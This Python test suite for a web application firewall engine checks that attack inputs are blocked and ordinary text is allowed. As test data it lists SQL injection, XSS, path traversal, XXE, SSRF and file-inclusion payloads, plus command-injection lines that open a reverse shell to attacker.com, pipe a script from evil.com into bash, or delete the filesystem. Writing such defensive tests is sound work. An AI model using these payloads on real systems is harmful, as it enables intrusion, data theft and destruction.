"""
WAF Test Suite
Tests all attack detection patterns and WAF functionality
"""
import sys
import os
import unittest
import requests
import time
from typing import List, Tuple

# Add app directory to path for direct imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'app'))

from waf_engine import WAFEngine, get_detection_result, DetectionResult


class TestWAFEngineDirectly(unittest.TestCase):
    """Test WAF engine detection patterns directly (no HTTP server needed)"""
    
    @classmethod
    def setUpClass(cls):
        cls.engine = WAFEngine(paranoia_level=2)
    
    def _test_patterns(self, attack_type: str, payloads: List[str], should_detect: bool = True):
        """Helper to test multiple payloads"""
        results = []
        for payload in payloads:
            request_data = {
                'headers': {'User-Agent': 'TestAgent'},
                'params': {'input': payload},
                'body': '',
                'path': '/test',
                'method': 'GET'
            }
            result = self.engine.check_request(request_data)
            results.append((payload, result))
            
            if should_detect:
                self.assertTrue(
                    result.is_malicious,
                    f"Failed to detect {attack_type}: {payload[:50]}..."
                )
            else:
                self.assertFalse(
                    result.is_malicious,
                    f"False positive for {attack_type}: {payload[:50]}..."
                )
        return results
    
    # =========================================================================
    # SQL Injection Tests
    # =========================================================================
    def test_sql_injection_basic(self):
        """Test basic SQL injection patterns"""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "1' AND '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "1; DELETE FROM products",
        ]
        self._test_patterns('SQL Injection', payloads)
    
    def test_sql_injection_advanced(self):
        """Test advanced SQL injection patterns"""
        payloads = [
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(10000000,MD5('test'))--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1' ORDER BY 10--",
            "1' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2))--",
            "'; EXEC xp_cmdshell('dir')--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        ]
        self._test_patterns('SQL Injection Advanced', payloads)
    
    def test_sql_injection_encoded(self):
        """Test URL-encoded SQL injection"""
        payloads = [
            "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
            "%27%3B%20DROP%20TABLE%20users%3B--",  # '; DROP TABLE users;--
        ]
        self._test_patterns('SQL Injection Encoded', payloads)
    
    # =========================================================================
    # XSS Tests
    # =========================================================================
    def test_xss_basic(self):
        """Test basic XSS patterns"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ]
        self._test_patterns('XSS', payloads)
    
    def test_xss_advanced(self):
        """Test advanced XSS patterns"""
        payloads = [
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "<iframe src='javascript:alert(1)'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<svg><animate onbegin=alert(1)>",
        ]
        self._test_patterns('XSS Advanced', payloads)
    
    def test_xss_encoded(self):
        """Test encoded XSS patterns"""
        payloads = [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
        ]
        self._test_patterns('XSS Encoded', payloads)
    
    # =========================================================================
    # Command Injection Tests
    # =========================================================================
    def test_command_injection(self):
        """Test command injection patterns"""
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "`id`",
            "$(whoami)",
            "; rm -rf /",
            "| nc attacker.com 4444 -e /bin/sh",
            "; curl http://evil.com/shell.sh | bash",
        ]
        self._test_patterns('Command Injection', payloads)
    
    # =========================================================================
    # Path Traversal Tests
    # =========================================================================
    def test_path_traversal(self):
        """Test path traversal patterns"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        self._test_patterns('Path Traversal', payloads)
    
    # =========================================================================
    # XXE Tests
    # =========================================================================
    def test_xxe(self):
        """Test XXE (XML External Entity) patterns"""
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!ENTITY xxe SYSTEM "http://evil.com/xxe">',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>',
        ]
        self._test_patterns('XXE', payloads)
    
    # =========================================================================
    # SSRF Tests
    # =========================================================================
    def test_ssrf(self):
        """Test SSRF patterns"""
        payloads = [
            "http://127.0.0.1/admin",
            "http://localhost:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::1]/admin",
            "http://0.0.0.0:8080",
            "file:///etc/passwd",
            "gopher://localhost:25/",
            "dict://localhost:11211/",
        ]
        self._test_patterns('SSRF', payloads)
    
    # =========================================================================
    # LFI Tests
    # =========================================================================
    def test_lfi(self):
        """Test Local File Inclusion patterns"""
        payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
        ]
        self._test_patterns('LFI', payloads)
    
    # =========================================================================
    # RFI Tests
    # =========================================================================
    def test_rfi(self):
        """Test Remote File Inclusion patterns"""
        payloads = [
            "http://evil.com/shell.php",
            "https://attacker.com/malware.txt",
            "ftp://evil.com/backdoor.php",
        ]
        self._test_patterns('RFI', payloads)
    
    # =========================================================================
    # LDAP Injection Tests
    # =========================================================================
    def test_ldap_injection(self):
        """Test LDAP injection patterns"""
        payloads = [
            "admin)(|(password=*))",
            "*)(uid=*))(|(uid=*",
            ")(cn=*",
        ]
        self._test_patterns('LDAP Injection', payloads)
    
    # =========================================================================
    # Header Injection Tests
    # =========================================================================
    def test_header_injection(self):
        """Test header injection patterns"""
        payloads = [
            "test\r\nX-Injected: header",
            "test%0d%0aX-Injected: header",
            "value\nSet-Cookie: malicious=true",
        ]
        self._test_patterns('Header Injection', payloads)
    
    # =========================================================================
    # Scanner Detection Tests
    # =========================================================================
    def test_scanner_detection(self):
        """Test known scanner/bot detection"""
        scanner_agents = [
            "sqlmap/1.0",
            "nikto/2.1.6",
            "nmap scripting engine",
            "Acunetix Web Vulnerability Scanner",
            "burp",
            "ZAP/2.11.0",
        ]
        for agent in scanner_agents:
            request_data = {
                'headers': {'User-Agent': agent},
                'params': {},
                'body': '',
                'path': '/test',
                'method': 'GET'
            }
            result = self.engine.check_request(request_data)
            self.assertTrue(
                result.is_malicious,
                f"Failed to detect scanner: {agent}"
            )
    
    # =========================================================================
    # False Positive Tests (should NOT be detected)
    # =========================================================================
    def test_false_positives(self):
        """Test that legitimate requests are not blocked"""
        legitimate_inputs = [
            "Hello, my name is John O'Brien",
            "SELECT the best product",
            "Buy 1 get 1 free",
            "Email: user@example.com",
            "Price: $100 or less",
            "The quick brown fox",
            "2 + 2 = 4",
            "Let's meet at 5pm",
        ]
        self._test_patterns('False Positives', legitimate_inputs, should_detect=False)


class TestWAFHTTP(unittest.TestCase):
    """Test WAF via HTTP requests (requires running WAF server)"""
    
    WAF_URL = "http://localhost:5000"
    
    @classmethod
    def setUpClass(cls):
        """Check if WAF is running"""
        try:
            response = requests.get(f"{cls.WAF_URL}/waf/health", timeout=5)
            cls.waf_running = response.status_code == 200
        except (requests.RequestException, ConnectionError, TimeoutError):
            cls.waf_running = False
            print("\n[WARNING] WAF server not running. Skipping HTTP tests.")
    
    def setUp(self):
        if not self.waf_running:
            self.skipTest("WAF server not running")
    
    def test_health_endpoint(self):
        """Test health check endpoint"""
        response = requests.get(f"{self.WAF_URL}/waf/health")
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertEqual(data['status'], 'healthy')
    
    def test_sql_injection_blocked(self):
        """Test SQL injection is blocked via HTTP"""
        response = requests.get(
            f"{self.WAF_URL}/api/users",
            params={"id": "' OR '1'='1"}
        )
        self.assertEqual(response.status_code, 403)
        self.assertIn("WAF", response.text)
    
    def test_xss_blocked(self):
        """Test XSS is blocked via HTTP"""
        response = requests.get(
            f"{self.WAF_URL}/search",
            params={"q": "<script>alert('xss')</script>"}
        )
        self.assertEqual(response.status_code, 403)
    
    def test_path_traversal_blocked(self):
        """Test path traversal is blocked via HTTP"""
        response = requests.get(f"{self.WAF_URL}/../../../etc/passwd")
        self.assertEqual(response.status_code, 403)
    
    def test_legitimate_request_allowed(self):
        """Test legitimate requests pass through"""
        response = requests.get(
            f"{self.WAF_URL}/api/products",
            params={"category": "electronics"}
        )
        # Should either pass (200) or get backend error (502), not be blocked (403)
        self.assertNotEqual(response.status_code, 403)


def run_quick_test():
    """Run a quick interactive test showing results"""
    print("\n" + "="*70)
    print("WAF DETECTION TEST")
    print("="*70 + "\n")
    
    engine = WAFEngine(paranoia_level=2)
    
    test_cases = [
        ("SQL Injection", "' OR '1'='1"),
        ("SQL Injection", "'; DROP TABLE users;--"),
        ("SQL Injection", "1' AND SLEEP(5)--"),
        ("XSS", "<script>alert('XSS')</script>"),
        ("XSS", "<img src=x onerror=alert(1)>"),
        ("Command Injection", "; cat /etc/passwd"),
        ("Command Injection", "$(whoami)"),
        ("Path Traversal", "../../../etc/passwd"),
        ("XXE", '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
        ("SSRF", "http://169.254.169.254/latest/meta-data/"),
        ("LFI", "php://filter/convert.base64-encode/resource=index.php"),
        ("Legitimate", "Hello, my name is John"),
        ("Legitimate", "Buy 2 get 1 free"),
        ("Legitimate", "Contact: user@example.com"),
    ]
    
    passed = 0
    failed = 0
    
    for attack_type, payload in test_cases:
        request_data = {
            'headers': {'User-Agent': 'TestAgent'},
            'params': {'input': payload},
            'body': '',
            'path': '/test',
            'method': 'GET'
        }
        result = engine.check_request(request_data)
        
        is_legitimate = attack_type == "Legitimate"
        expected_blocked = not is_legitimate
        actual_blocked = result.is_malicious
        
        if expected_blocked == actual_blocked:
            status = "PASS"
            passed += 1
        else:
            status = "FAIL"
            failed += 1
        
        blocked_str = "BLOCKED" if actual_blocked else "ALLOWED"
        detected_type = result.attack_type if result.attack_type else "N/A"
        
        print(f"[{status}] {attack_type:20} | {blocked_str:7} | {payload[:40]}...")
        if actual_blocked and result.attack_type:
            print(f"       Detected as: {detected_type}, Severity: {result.severity}")
    
    print("\n" + "="*70)
    print(f"RESULTS: {passed} passed, {failed} failed")
    print("="*70 + "\n")
    
    return failed == 0


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='WAF Test Suite')
    parser.add_argument('--quick', action='store_true', help='Run quick interactive test')
    parser.add_argument('--http', action='store_true', help='Include HTTP tests (requires running WAF)')
    args = parser.parse_args()
    
    if args.quick:
        success = run_quick_test()
        sys.exit(0 if success else 1)
    else:
        # Run unittest suite
        loader = unittest.TestLoader()
        suite = unittest.TestSuite()
        
        # Always add direct engine tests
        suite.addTests(loader.loadTestsFromTestCase(TestWAFEngineDirectly))
        
        # Optionally add HTTP tests
        if args.http:
            suite.addTests(loader.loadTestsFromTestCase(TestWAFHTTP))
        
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        sys.exit(0 if result.wasSuccessful() else 1)
